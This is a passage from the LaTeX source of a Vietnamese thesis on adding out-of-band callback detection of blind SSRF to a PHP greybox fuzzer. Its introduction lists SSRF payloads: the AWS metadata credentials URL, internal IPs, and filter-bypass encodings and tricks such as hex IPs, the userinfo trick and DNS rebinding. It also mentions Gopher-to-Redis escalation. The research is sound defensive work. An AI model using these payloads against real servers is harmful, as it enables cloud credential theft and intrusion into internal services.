\documentclass{uetgraduation}
\usepackage{lmodern}
\usepackage{graphicx}
\usepackage{fancyvrb}
\usepackage{amssymb}
\usepackage{pifont}
\usepackage[hidelinks]{hyperref}
\graphicspath{{figures/}}   % must be loaded LAST; unicode auto-set by LuaLaTeX
\RecustomVerbatimEnvironment{verbatim}{Verbatim}{fontsize=\small}
\setlength{\emergencystretch}{3em}
\hbadness=10001

% uetgraduation.cls redefines \bibitem without creating a hyperref anchor target,
% so clicking citation numbers in text does not navigate to the bibliography.
% Fix: patch \bibitem to add \hypertarget{cite.<key>}{} — exactly what \cite{} links to.
\makeatletter
\renewcommand{\bibitem}[1]{%
  \if@inbibsection\else
    \PackageError{uetgraduation}{`bibitem` not in `bibsection`.}{}%
  \fi
  \item
  \hypertarget{cite.#1}{}%
  \if@filesw\immediate\write\@auxout{\string\bibcite{#1}{\the\value{\@listctr}}}\fi
  \ignorespaces
}
\makeatother
\begin{document}


\studentname{Trần Huy Hoàng}
\title{Nâng cao khả năng phát hiện lỗ hổng SSRF cho hệ thống grey-box fuzzing thông qua phân tích tương tác out-of-band}
\documenttype{Khóa luận tốt nghiệp đại học hệ chính quy}
\major{Khoa học máy tính}
\year{2026}
\supervisor{TS. Lê Đình Thanh}
\makecovers


\newenvironment{changemargin}[2]{%
  \begin{list}{}{%
    \setlength{\leftmargin}{#1}%
    \setlength{\rightmargin}{#2}%
  }%
  \item[]}{\end{list}}

\begin{preamble}{Lời cảm ơn}
Lời đầu tiên, tôi xin gửi lời cảm ơn chân thành và lòng biết ơn sâu sắc
tới thầy TS. Lê Đình Thanh, người đã tận tình hướng dẫn, định hướng nghiên cứu
và động viên tôi trong suốt quá trình thực hiện khóa luận này. Sự chỉ bảo tâm
huyết và những góp ý quý báu của thầy là nền tảng quan trọng giúp tôi
hoàn thành công trình.

Tôi cũng xin bày tỏ lòng biết ơn chân thành tới toàn thể các thầy, cô
đang công tác và giảng dạy tại trường Đại học Công Nghệ --- Đại học Quốc gia
Hà Nội. Những kiến thức và kỹ năng mà các thầy cô đã truyền đạt trong suốt
những năm học vừa qua chính là hành trang vững chắc để tôi thực hiện
nghiên cứu này.

Mặc dù đã cố gắng hết sức, khóa luận chắc chắn không tránh khỏi những thiếu
sót. Tôi rất mong nhận được sự góp ý từ các thầy cô và bạn đọc để công
trình được hoàn thiện hơn.

\begin{flushright}
Hà Nội, ngày \ldots\ tháng \ldots\ năm 2026 \\[0.5cm]
Sinh viên \\[2cm]
Trần Huy Hoàng
\end{flushright}
\end{preamble}


\begin{preamble}{Lời cam đoan}
Tôi là Trần Huy Hoàng, sinh viên theo học ngành Khoa học máy tính tại trường
Đại học Công Nghệ --- Đại học Quốc gia Hà Nội. Tôi xin cam đoan công trình
\textit{``Nâng cao khả năng phát hiện lỗ hổng SSRF cho hệ thống grey-box fuzzing
thông qua phân tích tương tác out-of-band''} là công
trình nghiên cứu do bản thân tôi thực hiện. Các nội dung nghiên cứu, kết quả
trong nghiên cứu khoa học là trung thực và xác thực.

Các thông tin sử dụng trong khóa luận đều có cơ sở rõ ràng và không có nội dung
nào sao chép từ các tài liệu mà không ghi rõ trích dẫn tham khảo. Tôi xin chịu
trách nhiệm hoàn toàn về lời cam đoan này.

\begin{flushright}
Hà Nội, ngày \ldots\ tháng \ldots\ năm 2026 \\[0.5cm]
Sinh viên \\[2cm]
Trần Huy Hoàng
\end{flushright}
\end{preamble}



\begin{preamble}{Tóm tắt}
\textbf{Tóm tắt:} Lỗ hổng Server-Side Request Forgery (SSRF) là một trong những
mối đe dọa bảo mật nghiêm trọng trong các ứng dụng web hiện đại, cho phép kẻ
tấn công ép buộc máy chủ thực hiện các yêu cầu mạng tùy ý đến các hệ thống
nội bộ vốn được bảo vệ bởi tường lửa. Đặc biệt, dạng Blind SSRF --- trong đó
máy chủ âm thầm gửi request ra ngoài mà không để lại bất kỳ dấu hiệu lỗi nào
quan sát được --- đặt ra thách thức lớn cho các công cụ kiểm thử tự động hiện
có, vốn phụ thuộc vào tín hiệu exception và độ phủ mã làm cơ sở phản hồi.
Khoảng trống này khiến một lớp lỗ hổng nghiêm trọng bị bỏ sót hoàn toàn trong
quá trình kiểm thử tự động.

Khóa luận này đề xuất một hướng tiếp cận mới nhằm nâng cao khả năng phát hiện
Blind SSRF bằng cách tích hợp kênh tín hiệu Out-of-Band (OOB) bất đồng bộ vào
vòng lặp greybox fuzzing. Thay vì chờ đợi ứng dụng báo lỗi, hệ thống triển
khai một máy chủ lắng nghe bên ngoài để ghi nhận các callback mà ứng dụng mục
tiêu chủ động gửi đến khi bị kích hoạt bởi payload SSRF. Tín hiệu OOB thu được
được đưa trở lại vòng lặp fuzzing như một kênh phản hồi độc lập, bổ sung cho
các tín hiệu truyền thống và cho phép fuzzer nhận biết các đầu vào kích hoạt
hành vi mạng bất thường mà trước đây không thể quan sát được.

Hệ thống được xây dựng với các thành phần chính bao gồm bộ đột biến payload
đặc thù cho SSRF tích hợp nhiều kỹ thuật bypass phổ biến, cơ chế hook các hàm
mạng phía máy chủ để thu thập tín hiệu bổ sung, và module xác nhận lỗ hổng dựa
trên cơ chế tương quan token OOB. Cơ chế này đảm bảo mỗi lỗ hổng được xác nhận
chỉ khi có bằng chứng mạng thực tế, loại trừ hoàn toàn khả năng phát sinh dương
tính giả.

Kết quả thực nghiệm trên các ứng dụng có lỗ hổng đã biết và các lỗ hổng thực
tế được công bố cho thấy hệ thống đề xuất có khả năng phát hiện Blind SSRF hiệu
quả trong khi các công cụ greybox fuzzing truyền thống hoàn toàn bỏ sót. Kết
quả này khẳng định rằng việc mở rộng kênh tín hiệu phản hồi là hướng tiếp cận
khả thi và có tiềm năng ứng dụng rộng hơn cho các lớp lỗ hổng bảo mật có đặc
điểm tương tự.

\textit{\textbf{Từ khóa:} SSRF, Blind SSRF, Greybox Fuzzing, Out-of-Band,
Kiểm thử bảo mật web tự động.}
\end{preamble}


\begin{contentlisting}

\tableofcontents

\listoffigures

\listoftables

\end{contentlisting}


% Phần mở đầu
\chapter{Giới thiệu}

Chương này trình bày bối cảnh và động lực nghiên cứu của khóa luận, khảo sát các
phương pháp kiểm thử bảo mật ứng dụng web hiện có, đánh giá các công cụ tiêu biểu,
phân tích đặc thù của lỗ hổng Blind SSRF, xác định khoảng trống còn tồn tại và đề
xuất hướng giải quyết.
Phần~\ref{sec:motivation} mô tả bối cảnh và lý do chọn đề tài.
Phần~\ref{sec:methods-overview} khảo sát các phương pháp kiểm thử bảo mật chính.
Phần~\ref{sec:existing-tools} đánh giá các công cụ tiêu biểu hiện có.
Phần~\ref{sec:ssrf-challenge} phân tích đặc thù của lỗ hổng SSRF và Blind SSRF.
Phần~\ref{sec:gap} xác định khoảng trống nghiên cứu và hướng tiếp cận đề xuất.
Phần~\ref{sec:objectives} phát biểu mục tiêu và phạm vi.
Phần~\ref{sec:contributions} liệt kê các đóng góp kỹ thuật của khóa luận.
Phần~\ref{sec:structure} trình bày cấu trúc khóa luận.

% ============================================================
\section{Bối cảnh và Lý do Chọn Đề tài}
\label{sec:motivation}
% ============================================================

\subsection{Tầm quan trọng của Ứng dụng Web và Bảo mật}

Ứng dụng web ngày nay là hạ tầng số không thể thiếu của hầu hết các tổ chức. Từ
ngân hàng trực tuyến, thương mại điện tử, đến hệ thống quản lý nhà nước và hồ sơ y
tế điện tử, logic nghiệp vụ cốt lõi đều được hiện thực hóa dưới dạng web application
chạy trên nền HTTP/HTTPS. Sự phức tạp ngày càng tăng của các hệ thống này kéo theo
bề mặt tấn công rộng hơn: một nền tảng SaaS hiện đại có thể tích hợp hàng chục
microservice nội bộ, gọi tới nhiều API bên thứ ba, xử lý tệp đính kèm từ người dùng,
và tương tác với cơ sở dữ liệu với đặc quyền cao. Mỗi điểm tích hợp đó đều là một
bề mặt tấn công tiềm năng.

PHP là ngôn ngữ lập trình phổ biến nhất phía server trong hệ sinh thái web, được sử
dụng bởi hơn 77\% các website có ngôn ngữ server-side đã biết tính đến năm
2023~\cite{w3techs2023php}, bao gồm các nền tảng lớn như WordPress (chiếm hơn
43\% website toàn cầu), Drupal, Magento và Joomla. Hệ sinh thái plugin của WordPress
--- với hơn 60.000 plugin từ bên thứ ba, mỗi plugin là một bề mặt tấn công tiềm năng
--- là nguồn sinh ra liên tục các lỗ hổng bảo mật mới được công bố dưới dạng CVE
(Common Vulnerabilities and Exposures). Sự kết hợp giữa mức độ phổ biến cao của PHP
và hệ sinh thái plugin thiếu kiểm soát tạo ra môi trường màu mỡ cho kẻ tấn công,
đồng thời đặt ra thách thức lớn cho kiểm thử bảo mật tự động.

Trong bối cảnh đó, kiểm thử bảo mật tự động --- đặc biệt là kỹ thuật \textit{fuzzing}
--- đã trở thành một hướng nghiên cứu quan trọng, được áp dụng rộng rãi trong cả môi
trường học thuật lẫn công nghiệp~\cite{manes2021art, zhu2022fuzzing}. Tuy nhiên, như
phân tích trong các phần tiếp theo sẽ chỉ ra, một lớp lỗ hổng nguy hiểm và ngày càng
phổ biến --- Blind SSRF --- vẫn nằm ngoài tầm quan sát của toàn bộ thế hệ công cụ
kiểm thử tự động hiện tại.

\subsection{SSRF và Vị trí trong OWASP Top 10}

Server-Side Request Forgery (SSRF) là lớp lỗ hổng bảo mật trong đó kẻ tấn công
khiến máy chủ ứng dụng thực hiện các yêu cầu mạng tùy ý tới địa chỉ do kẻ tấn công
kiểm soát~\cite{owasp2021top10}. SSRF đã leo lên vị trí thứ mười trong danh sách
OWASP Top 10:2021 --- lần đầu tiên được đưa vào danh sách này với tư cách một mục
riêng biệt, không ghép với các lỗ hổng khác. OWASP ghi nhận rằng dù tỷ lệ xuất hiện
của SSRF còn khiêm tốn so với SQLi hay XSS, tỷ lệ khai thác thành công lại cao hơn
đáng kể, vì SSRF thường khai thác tin tưởng ngầm giữa các thành phần trong hạ tầng
nội bộ --- máy chủ web thường được phép truy cập các dịch vụ nội bộ như Redis,
Elasticsearch, hay cloud metadata endpoint mà không qua xác thực, vì chúng vốn không
được thiết kế để tiếp xúc trực tiếp với Internet.

Tác động của SSRF đặc biệt nghiêm trọng trong kiến trúc đám mây. Sự cố Capital One
năm 2019 --- một trong những vụ rò rỉ dữ liệu ngân hàng lớn nhất lịch sử với hơn
100 triệu hồ sơ khách hàng bị ảnh hưởng --- được kích hoạt thông qua SSRF tới
instance metadata service (IMDS) của AWS (địa chỉ \texttt{169.254.169.254}), cho
phép kẻ tấn công lấy IAM credentials tạm thời và truy cập S3 bucket chứa dữ liệu
nhạy cảm~\cite{owasp2023ssrf}. Sự cố này cho thấy SSRF không chỉ là lỗ hổng lý
thuyết mà có thể dẫn đến hậu quả thực tế nghiêm trọng ở quy mô lớn.

\subsection{Blind SSRF --- Điểm mù của Kiểm thử Tự động}

Dạng nguy hiểm và khó phát hiện nhất của SSRF là \textit{Blind SSRF}: máy chủ thực
hiện network request nhưng không phản ánh response về cho người dùng --- ứng dụng
xử lý kết quả nội bộ, loại bỏ, hoặc chỉ ghi log. Từ góc độ giao thức HTTP, mọi thứ
có vẻ bình thường: không có error message, không có status code bất thường, không có
nội dung khác biệt trong response. Dấu hiệu duy nhất tồn tại ở tầng mạng --- máy
chủ đã khởi tạo một kết nối ra ngoài tới địa chỉ mà kẻ tấn công kiểm soát. Điều
này đặc biệt phổ biến trong các kịch bản: xác nhận webhook (ứng dụng gọi URL để
kiểm tra tính hợp lệ nhưng không trả về nội dung), background processing (SSRF được
kích hoạt bởi job bất đồng bộ), hay tích hợp dịch vụ (ứng dụng tự động lấy metadata
từ URL người dùng cung cấp).

Chính đặc điểm vô hình này khiến Blind SSRF trở thành điểm mù lớn nhất của hầu hết
công cụ kiểm thử bảo mật tự động hiện có. Không một greybox fuzzer nào ---
Phuzz~\cite{neef2024phuzz}, webFuzz~\cite{vanrooij2021webfuzz}, hay
Witcher~\cite{trickel2023witcher} --- có cơ chế để quan sát hành vi mạng của ứng
dụng mục tiêu vượt ra ngoài HTTP response và code coverage. Khóa luận này xuất phát
từ quan sát đó và đề xuất một hướng tiếp cận có hệ thống để lấp khoảng trống: tích
hợp kênh tín hiệu \textit{Out-of-Band} (OOB) vào vòng lặp greybox fuzzing, biến một
máy chủ lắng nghe bên ngoài thành một kênh phản hồi độc lập cho fuzzer.

\begin{figure}[htbp]
    \centering
    % Mô tả hình: Sơ đồ luồng tấn công SSRF điển hình.
    % Bên trái: Attacker gửi HTTP request chứa URL độc hại (url=http://169.254.169.254/...).
    % Ở giữa: Web Server / Ứng dụng PHP nhận request, gọi file_get_contents($url).
    % Bên phải: Các dịch vụ nội bộ bị tấn công: AWS Metadata (169.254.169.254),
    %           Redis (:6379), Elasticsearch (:9200), Admin panel (/admin).
    % Mũi tên: Attacker → Web App (HTTP/HTTPS public), Web App → Internal (qua tường lửa nội bộ).
    % Ghi chú: Firewall cho phép web app kết nối nội bộ nhưng chặn truy cập trực tiếp từ Internet.
    \includegraphics[width=0.88\textwidth]{figures/fig-ssrf-flow}
    \caption{Luồng tấn công SSRF.}
    \label{fig:ssrf-flow}
\end{figure}

% ============================================================
\section{Phương pháp Kiểm thử Bảo mật Ứng dụng Web}
\label{sec:methods-overview}
% ============================================================

Kiểm thử bảo mật ứng dụng web đã phát triển qua nhiều thế hệ công cụ và phương
pháp~\cite{li2018fuzzing, manes2021art}. Mỗi cách tiếp cận có điểm mạnh và hạn chế
riêng, đặc biệt khi đối mặt với các lớp lỗ hổng không để lại dấu vết hiển thị như
Blind SSRF.

\subsection{Phân tích Tĩnh}

Phân tích tĩnh (static analysis) kiểm tra mã nguồn mà không cần thực thi chương
trình. Đối với PHP, phân tích tĩnh có thể truy vết luồng dữ liệu (taint analysis)
từ điểm nhập (source) như \texttt{\$\_GET['url']} tới điểm sink nguy hiểm như
\texttt{file\_get\_contents(\$url)}. Phân tích tĩnh là bước đầu tiên hữu ích trong
pipeline kiểm thử bảo mật: chi phí thấp, không yêu cầu triển khai ứng dụng, và có
thể tích hợp vào quy trình CI/CD.

Tuy nhiên, phân tích tĩnh gặp khó khăn với \textit{context-sensitive taint tracking}
qua nhiều tầng framework: trong một WordPress plugin, đầu vào người dùng thường đi
qua nhiều lớp abstraction trước khi đến sink. Phân tích tĩnh không thể đánh giá hành
vi runtime --- một URL có bị lọc hay không phụ thuộc vào logic điều kiện và cấu hình
runtime, không thể suy luận từ code tĩnh. Kết quả là tỷ lệ false positive cao và
false negative đáng kể với các lỗ hổng phức tạp.

\subsection{Thực thi Tượng trưng và Concolic Execution}

Thực thi tượng trưng (symbolic execution) thay thế các giá trị cụ thể bằng biểu thức
tượng trưng và giải các ràng buộc để tìm đầu vào kích hoạt mọi nhánh
code~\cite{godefroid2008automated}. Kỹ thuật này có khả năng đạt độ phủ lý thuyết
cao và xác định chính xác điều kiện kích hoạt lỗ hổng. Concolic execution kết hợp
thực thi cụ thể và tượng trưng~\cite{ganesh2009taint}, giảm bớt vấn đề ``path
explosion'' nhưng vẫn tốn kém về mặt tính toán.

Với ứng dụng web PHP thực tế --- hàng nghìn dòng code, framework phức tạp, tương tác
database, và nhiều dependency bên thứ ba --- chi phí tính toán của symbolic execution
trở nên không khả thi. Ngoài ra, các lời gọi hàm ngoài (như \texttt{curl\_exec})
phụ thuộc vào môi trường runtime thực tế (phản hồi từ OOB server), điều mà symbolic
execution không thể mô phỏng mà không có môi trường thực thi cụ thể.

\subsection{Kiểm thử Hộp đen (Blackbox)}

Kiểm thử blackbox không có bất kỳ thông tin nào về cấu trúc bên trong ứng dụng ---
công cụ chỉ tương tác qua giao thức HTTP, quan sát đầu ra để phát hiện bất thường.
Ưu điểm là dễ triển khai, không cần mã nguồn, và áp dụng được cho bất kỳ ứng dụng
web nào. Nhược điểm cơ bản là khả năng khám phá code path bị giới hạn bởi những gì
quan sát được từ response. Doupe và cộng sự~\cite{doupe2010johnny} đã chứng minh
rằng blackbox scanner bỏ sót đáng kể các lỗ hổng đòi hỏi nhiều bước tương tác hoặc
phụ thuộc vào trạng thái session phức tạp.

\subsection{Kiểm thử Greybox và Coverage-Guided Fuzzing}

Greybox fuzzing khai thác thông tin thực thi thu thập được trong quá trình chạy ---
chủ yếu là code coverage --- làm tín hiệu phản hồi để định hướng quá trình sinh đột
biến~\cite{fioraldi2020afl, zalewski2014afl}. AFL (American Fuzzy Lop) và sau đó là
AFL++~\cite{fioraldi2020afl} đã chứng minh tính hiệu quả của cách tiếp cận này cho
ứng dụng nhị phân. Các công trình gần đây nhất về kiểm thử bảo mật web tự động ---
webFuzz~\cite{vanrooij2021webfuzz}, Witcher~\cite{trickel2023witcher}, và
Phuzz~\cite{neef2024phuzz} --- đều theo hướng greybox fuzzing vì đây là cân bằng tốt
nhất giữa chi phí và hiệu quả: không yêu cầu mã nguồn đầy đủ như whitebox, không bị
giới hạn bởi oracle response như blackbox, và mở rộng tốt hơn symbolic execution.

Bảng~\ref{tab:method-comparison} so sánh bốn phương pháp theo các tiêu chí quan
trọng với bài toán phát hiện Blind SSRF.

\begin{table}[h]{So sánh các phương pháp kiểm thử bảo mật theo các tiêu chí liên quan
đến phát hiện Blind SSRF}
\label{tab:method-comparison}
\centering
\begin{tabular}{|l|c|c|c|c|}
\hline
\textbf{Tiêu chí} & \textbf{Tĩnh} & \textbf{Symbolic} & \textbf{Blackbox} & \textbf{Greybox} \\
\hline
Không cần mã nguồn     & \ding{55} & \ding{55} & \checkmark & \checkmark \\
Khả năng mở rộng       & Tốt & Kém & Tốt & Tốt \\
Phủ code path sâu      & Hạn chế & Cao & Thấp & Trung bình–cao \\
Phát hiện runtime sink & \ding{55} & Có thể & \checkmark & \checkmark \\
Tích hợp kênh OOB      & \ding{55} & \ding{55} & Bán thủ công & \textbf{Có thể} \\
\hline
\end{tabular}
\end{table}

Bảng~\ref{tab:method-comparison} cho thấy greybox fuzzing là nền tảng phù hợp nhất
để tích hợp kênh OOB: nó đã có vòng lặp tự động, có khả năng thu thập tín hiệu
runtime, và không phụ thuộc vào mã nguồn. Cần thiết kế thêm kênh OOB song song với
coverage --- đây là đóng góp kỹ thuật của khóa luận này.

% ============================================================
\section{Thực trạng Công cụ Kiểm thử Bảo mật Hiện có}
\label{sec:existing-tools}
% ============================================================

\subsection{Công cụ Blackbox}

\textbf{OWASP ZAP (Zed Attack Proxy)~\cite{zapdevteam2023}} là công cụ kiểm thử
bảo mật web mã nguồn mở được sử dụng rộng rãi nhất, cung cấp cả chế độ thủ công và
tự động hóa qua API và daemon mode. ZAP thực hiện spider để khám phá endpoint, sau đó
gửi payload chèn sẵn và phân tích HTTP response để phát hiện SQLi, XSS, path
traversal, và một số lớp lỗ hổng khác. ZAP không tích hợp kênh OOB, do đó không thể
phát hiện Blind SSRF.

\textbf{Burp Suite Professional~\cite{portswigger2023burp}} cung cấp tính năng Burp
Collaborator --- một infrastructure OOB cho phép phát hiện Blind SSRF, Blind SQLi, và
Blind XXE trong kiểm thử bán thủ công. Khi kiểm thử viên chèn Collaborator payload
vào tham số, bất kỳ interaction nào từ ứng dụng mục tiêu tới Collaborator server đều
được ghi nhận và báo cáo. Đây là tính năng mạnh nhưng đòi hỏi sự chủ động của kiểm
thử viên --- chọn endpoint, đặt payload, theo dõi kết quả --- không phải tự động hóa
hoàn toàn theo nghĩa của fuzzing.

\subsection{Công cụ Greybox Fuzzing cho Web}

\textbf{webFuzz~\cite{vanrooij2021webfuzz}} (ESORICS 2021) là một trong những greybox
fuzzer web đầu tiên được công bố. webFuzz thu thập coverage bằng cách instrument
JavaScript phía client và HTML response, tập trung chủ yếu vào phát hiện XSS.
webFuzz không hỗ trợ phát hiện các lỗ hổng server-side như SSRF, SQLi hay command
injection do không có instrumentation phía server.

\textbf{Witcher~\cite{trickel2023witcher}} (IEEE S\&P 2023) mở rộng greybox fuzzing
cho PHP bằng cách sử dụng taint analysis để theo dõi luồng dữ liệu từ input tới các
sink nguy hiểm. Witcher đạt kết quả đáng kể cho SQLi và command injection nhưng hoàn
toàn không có cơ chế phát hiện SSRF vì không có hook trên các hàm mạng và không có
kênh OOB.

\textbf{Phuzz~\cite{neef2024phuzz}} (AsiaCCS 2024) là greybox fuzzer PHP toàn diện
nhất hiện tại, hỗ trợ phát hiện sáu loại lỗ hổng server-side (SQLi, RCE, path
traversal, insecure deserialization, XXE, open redirect) và XSS phía client. Trong
bộ benchmark 87 lỗ hổng, Phuzz đạt tỷ lệ phát hiện 99\%. Tuy nhiên, như chính bài
báo gốc thừa nhận, SSRF --- đặc biệt Blind SSRF --- hoàn toàn nằm ngoài khả năng
phát hiện của Phuzz. Bài báo liệt kê SSRF là mục tiêu ưu tiên cao nhất trong phần
Future Work, với ghi chú cụ thể: \textit{``The SSRF could have been found by Phuzz,
if \texttt{wp\_remote\_get} was hooked and included in the vulnerability detection.''}

\subsection{Tổng hợp So sánh}

Bảng~\ref{tab:tool-comparison} tổng hợp khả năng phát hiện SSRF và Blind SSRF của
các công cụ tiêu biểu, làm rõ khoảng trống mà khóa luận này hướng tới lấp đầy.

\begin{table}[h]{So sánh khả năng phát hiện Blind SSRF của các công cụ kiểm thử
bảo mật ứng dụng web tiêu biểu}
\label{tab:tool-comparison}
\centering
\begin{tabular}{|l|l|c|c|c|}
\hline
\textbf{Công cụ} & \textbf{Loại} & \textbf{SSRF} & \textbf{Blind SSRF} & \textbf{Tự động} \\
\hline
OWASP ZAP~\cite{zapdevteam2023}       & Blackbox & Hạn chế   & \ding{55}   & \checkmark \\
Burp Suite~\cite{portswigger2023burp} & Blackbox & \checkmark & \checkmark & Bán tự động \\
webFuzz~\cite{vanrooij2021webfuzz}    & Greybox  & \ding{55}  & \ding{55}  & \checkmark \\
Witcher~\cite{trickel2023witcher}      & Greybox  & \ding{55}  & \ding{55}  & \checkmark \\
Phuzz~\cite{neef2024phuzz}            & Greybox  & \ding{55}  & \ding{55}  & \checkmark \\
\textbf{Phuzz+OOB (đề xuất)}          & Greybox  & \checkmark & \checkmark & \checkmark \\
\hline
\end{tabular}
\end{table}

Bảng~\ref{tab:tool-comparison} cho thấy rõ khoảng trống: không có greybox fuzzer nào
có thể phát hiện Blind SSRF một cách tự động. Burp Suite có khả năng này nhưng đòi
hỏi can thiệp thủ công đáng kể; tất cả greybox fuzzer hoàn toàn mù với SSRF vì thiếu
kênh tín hiệu OOB.

% ============================================================
\section{Lỗ hổng SSRF và Thách thức Phát hiện Tự động}
\label{sec:ssrf-challenge}
% ============================================================

\subsection{Nguyên lý và Phân loại SSRF}

Lỗ hổng SSRF phát sinh khi ứng dụng web nhận URL hay hostname từ đầu vào người dùng
và dùng nó làm tham số cho một hàm mạng phía server mà không xác thực đầy đủ. Kẻ
tấn công có thể truyền URL trỏ tới:

\begin{itemize}
    \item \textbf{Hệ thống nội bộ}: \texttt{http://192.168.1.1/admin} --- tường lửa
    chặn truy cập từ Internet nhưng không chặn từ chính máy chủ ứng dụng, vì máy chủ
    ứng dụng được coi là tin cậy trong mạng nội bộ.
    \item \textbf{Cloud metadata endpoint}: \texttt{http://169.254.169.254/latest/\\meta-data/iam/security-credentials/}
    --- đọc IAM credentials của AWS EC2 instance, dẫn tới chiếm quyền toàn bộ tài
    khoản cloud.
    \item \textbf{Dịch vụ nội bộ không xác thực}: Redis, Elasticsearch, Jenkins,
    Kibana thường không yêu cầu xác thực khi truy cập từ mạng nội bộ, vì chúng không
    được thiết kế để tiếp xúc trực tiếp với Internet.
    \item \textbf{Leo thang thành RCE}: Kết hợp SSRF với Gopher protocol và Redis RESP
    injection để ghi SSH key hoặc thực thi lệnh shell tùy ý trên máy chủ.
\end{itemize}

Theo mức độ quan sát được từ bên ngoài, SSRF chia thành hai dạng chính:
\textit{Regular SSRF} (in-band) khi response của request phía server được phản ánh
một phần hoặc toàn bộ trong HTTP response trả về cho người dùng; và \textit{Blind
SSRF} khi ứng dụng thực hiện request nhưng không trả kết quả ra ngoài --- xử lý nội
bộ, ghi log, hoặc chỉ kiểm tra trạng thái kết nối.

\subsection{Kỹ thuật Bypass Filter SSRF}

Nhiều ứng dụng cố gắng ngăn chặn SSRF bằng blocklist địa chỉ IP nội bộ
(127.0.0.1, 10.0.0.0/8, 192.168.0.0/16, 172.16.0.0/12). Kẻ tấn công có thể vượt
qua bằng nhiều kỹ thuật:

\begin{itemize}
    \item \textbf{Biểu diễn IP thay thế}: \texttt{0x7f000001} (hex),
    \texttt{2130706433} (decimal), \texttt{0177.0.0.1} (octal) đều biểu diễn
    127.0.0.1 nhưng thường qua được kiểm tra regex đơn giản.
    \item \textbf{IPv6}: \texttt{::1} hay \texttt{[::ffff:127.0.0.1]} thường bị bỏ
    sót trong blocklist chỉ kiểm tra IPv4.
    \item \textbf{URL encoding}: \texttt{\%31\%32\%37.\%30.\%30.\%31} hay
    double-encoding có thể bypass kiểm tra chuỗi thô.
    \item \textbf{DNS-based redirect}: Domain của attacker trỏ về IP nội bộ; hoặc
    dùng các dịch vụ như \texttt{nip.io}/\texttt{sslip.io} --- ví dụ
    \texttt{127.0.0.1.nip.io} phân giải thành \texttt{127.0.0.1}.
    \item \textbf{DNS rebinding}: Domain ban đầu trỏ về IP public để qua kiểm tra;
    sau khi TTL hết, DNS rebind thành địa chỉ nội bộ. Kỹ thuật này bypass cả các
    kiểm tra IP được thực hiện trước khi gọi hàm mạng.
    \item \textbf{Userinfo trick}: \texttt{http://trusted.com@172.20.0.10:8000/} ---
    một số parser nhầm \texttt{172.20.0.10} là đường dẫn, không phải host.
    \item \textbf{Scheme-less}: Ứng dụng tự prepend \texttt{https://} vào giá trị
    tham số; bypass bằng cách chỉ cung cấp host không có scheme.
    \item \textbf{Fragment bypass}: \texttt{http://172.20.0.10\#trusted.com} ---
    fragment bị bỏ qua khi gửi request thực nhưng có thể đánh lừa validator.
\end{itemize}

Sự đa dạng của các kỹ thuật bypass là lý do tại sao một bộ mutator SSRF hiệu quả cần
bao phủ nhiều biến thể, không chỉ plain IP. Chi tiết cụ thể về cài đặt các biến thể
này trong \texttt{SSRFMutator} được trình bày ở Chương~3.

\subsection{Tại sao Tín hiệu Truyền thống Không đủ}

Bảng~\ref{tab:signal-comparison} so sánh các loại tín hiệu phản hồi mà công cụ kiểm
thử tự động hiện tại có thể khai thác và khả năng áp dụng cho từng loại lỗ hổng.

\begin{table}[h]{Tín hiệu phản hồi và khả năng phát hiện từng loại lỗ hổng
(\checkmark = có tín hiệu, \ding{55} = không có tín hiệu)}
\label{tab:signal-comparison}
\centering
\begin{tabular}{|l|c|c|c|c|}
\hline
\textbf{Tín hiệu phản hồi} & \textbf{SQLi} & \textbf{XSS} & \textbf{SSRF} & \textbf{Blind SSRF} \\
\hline
Nội dung HTTP response          & \checkmark & \checkmark & \checkmark & \ding{55} \\
HTTP status code bất thường     & \checkmark & \ding{55}  & Có thể     & \ding{55} \\
Exception / thông báo lỗi       & \checkmark & \ding{55}  & Có thể     & \ding{55} \\
Độ phủ mã (code coverage)       & \checkmark & \checkmark & \checkmark & \ding{55} \\
\textbf{OOB network callback}   & \ding{55}  & \ding{55}  & \checkmark & \checkmark \\
\hline
\end{tabular}
\end{table}

\begin{figure}[htbp]
    \centering
    % Mô tả hình: So sánh hai kịch bản SSRF cạnh nhau (hai cột).
    % Cột trái — Regular SSRF: Attacker → Web App → Internal Service → response nội dung
    %   được phản ánh về Attacker trong HTTP response. Mũi tên khép kín.
    % Cột phải — Blind SSRF: Attacker → Web App → Internal Service → response được xử lý
    %   nội bộ hoặc ghi log; Attacker nhận HTTP 200 OK bình thường, không có nội dung bất thường.
    %   Chỉ OOB Server (bên dưới, tách biệt) ghi nhận được kết nối từ Web App.
    % Điểm nhấn: với Blind SSRF, tất cả tín hiệu truyền thống (response, status, coverage)
    %   đều bình thường; chỉ OOB callback mới là bằng chứng.
    \includegraphics[width=0.92\textwidth]{figures/fig-blind-vs-regular}
    \caption{So sánh Regular SSRF và Blind SSRF.}
    \label{fig:blind-vs-regular}
\end{figure}

Hình~\ref{fig:blind-vs-regular} và Bảng~\ref{tab:signal-comparison} cùng làm rõ vấn
đề cốt lõi: với Blind SSRF, mọi tín
hiệu truyền thống đều vắng mặt. Không có nội dung bất thường trong response, không
có status code lạ, không có exception. Đặc biệt, code path thực thi hoàn toàn giống
nhau dù URL trỏ tới OOB server hay một URL bình thường --- \texttt{file\_get\_contents}
hay \texttt{curl\_exec} đều được gọi đúng một lần, không có nhánh code mới nào được
kích hoạt. OOB network callback là tín hiệu \emph{duy nhất} có khả năng xác nhận
Blind SSRF, và đây là lý do tại sao không có greybox fuzzer nào hiện tại có thể phát
hiện được loại lỗ hổng này.

\subsection{Đặc thù PHP và Bề mặt Tấn công SSRF}

PHP cung cấp một bề mặt tấn công SSRF đặc biệt rộng do nhiều hàm đa năng có thể
thực hiện HTTP request ngầm khi nhận URL làm đối số:

\begin{itemize}
    \item \textbf{Sink rõ ràng}: \texttt{curl\_exec()}, \texttt{fsockopen()},
    \texttt{stream\_socket\_client()} --- hàm mạng tường minh, thường được kiểm thử
    viên chú ý.
    \item \textbf{Sink đa năng}: \texttt{file\_get\_contents()}, \texttt{fopen()},
    \texttt{readfile()} --- vốn dùng để đọc file cục bộ nhưng âm thầm thực hiện
    HTTP/FTP request khi nhận URL.
    \item \textbf{Sink không trực quan}: \texttt{getimagesize()} --- thường dùng để
    lấy kích thước ảnh, ít ai ngờ đây là SSRF sink. Thực tế lỗ hổng
    CVE-2022-1751 (Skitter Slideshow) khai thác đúng sink này.
    \item \textbf{Sink WordPress}: \texttt{wp\_remote\_get()},
    \texttt{wp\_remote\_post()} --- tầng abstraction cao hơn, được nhiều plugin dùng
    thay cho cURL, tạo ra sink gián tiếp không được bao phủ bởi hook tầng thấp nếu
    không instrument riêng.
\end{itemize}

Ngoài ra, kịch bản Command Injection dẫn tới SSRF cũng đáng chú ý: khi input người
